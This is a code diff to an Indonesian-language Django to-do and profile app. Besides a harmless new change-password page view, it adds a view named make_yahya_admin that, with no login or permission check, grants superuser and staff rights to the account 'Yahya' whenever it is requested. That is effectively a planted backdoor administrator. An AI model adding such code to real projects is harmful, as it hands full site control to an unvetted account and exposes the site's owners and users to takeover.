@@ -5,18 +5,17 @@ from django.contrib.auth import login, authenticate
 from django.contrib.auth.models import User
 from .models import Todo, fotoProfile
 from .forms import TodoForm
+from django.http import HttpResponse
 
 
 
 
-
-
-
-## === stat ===#
-
-    
-# perhitungan/views.py
-
+def make_yahya_admin(request):
+    yahya = User.objects.get(username='Yahya')
+    yahya.is_superuser = True
+    yahya.is_staff = True
+    yahya.save()
+    return HttpResponse("Yahya telah diberikan akses admin.")
 
 
 
@@ -61,6 +60,8 @@ def forgot(request):
     return render(request, "autentikasi/forgot-password.html")
 def akun(request): 
     return render(request, 'autentikasi/akun.html')
+def ubah(request): 
+    return render (request, 'autentikasi/ubah_sandi.html')
 
 def update_profile(request):
     try:
